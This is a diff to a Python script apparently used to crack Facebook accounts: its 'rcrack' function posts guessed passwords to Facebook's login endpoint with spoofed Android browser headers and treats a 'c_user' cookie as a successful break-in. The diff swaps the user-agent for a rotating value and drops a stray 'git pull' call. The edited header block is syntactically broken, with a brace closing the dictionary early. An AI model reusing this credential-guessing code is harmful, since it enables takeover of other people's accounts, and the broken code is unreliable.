@@ -1,5 +1,4 @@
 import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
-os.system('git pull')
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -209,14 +208,12 @@ def rcrack(uid,pwx,tl):
 			"pass":ps,#ps
 			"login":"Log In"}
 			header_freefb = {
-		    'authority': 'mbasic.facebook.com',
+		    'authority': 'mbasic.facebook.com'}
             'method': 'GET',
             'path': '/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'een-US,en;q=0.9',
-            'cache-control': 'max-age=0',
+            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -225,7 +222,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            'user-agent': pro}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
